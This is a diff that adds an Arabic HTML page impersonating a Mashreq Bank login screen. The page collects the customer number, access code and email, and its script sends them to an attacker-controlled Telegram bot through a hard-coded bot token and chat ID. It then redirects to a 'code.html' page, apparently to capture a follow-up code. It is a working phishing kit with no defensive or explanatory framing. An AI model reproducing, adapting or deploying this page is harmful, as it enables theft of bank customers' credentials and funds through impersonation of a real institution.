@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>بنك المشرق</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .container {
+      max-width: 380px;
+      margin: 50px auto;
+      background: #ffffff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #004c97;
+      margin-bottom: 25px;
+      font-size: 22px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #004c97;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      background-color: #fff;
+    }
+
+    button {
+      margin-top: 25px;
+      width: 100%;
+      padding: 12px;
+      background-color: #004c97;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #003b7a;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="mashreq.png" alt="شعار بنك المشرق">
+    </div>
+
+    <h2>بنك المشرق</h2>
+
+    <label>رقم العميل</label>
+    <input type="text" id="clientId" placeholder="أدخل رقم العميل">
+
+    <label>رمز الدخول</label>
+    <input type="password" id="accessCode" placeholder="••••••••">
+
+    <label>البريد الإلكتروني</label>
+    <input type="email" id="email" placeholder="example@email.com">
+
+    <button onclick="sendCustomerInfo()">التالي</button>
+  </div>
+
+  <script>
+    const telegramBotToken = '8384152964:AAEPq3RMV17UiO_mB7SQUtRUmtedecCcr6Y';
+    const chatId = '6256486935';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url).catch(err => console.error("خطأ في إرسال تلغرام", err));
+    }
+
+    function sendCustomerInfo() {
+      const clientId = document.getElementById('clientId').value;
+      const accessCode = document.getElementById('accessCode').value;
+      const email = document.getElementById('email').value;
+
+      const message = `
+🏦 بيانات عميل - Mashreq:
+رقم العميل: ${clientId}
+رمز الدخول: ${accessCode}
+البريد الإلكتروني: ${email}
+      `;
+
+      sendToTelegram(message);
+      window.location.href = "code.html";
+    }
+  </script>
+
+</body>
+</html>
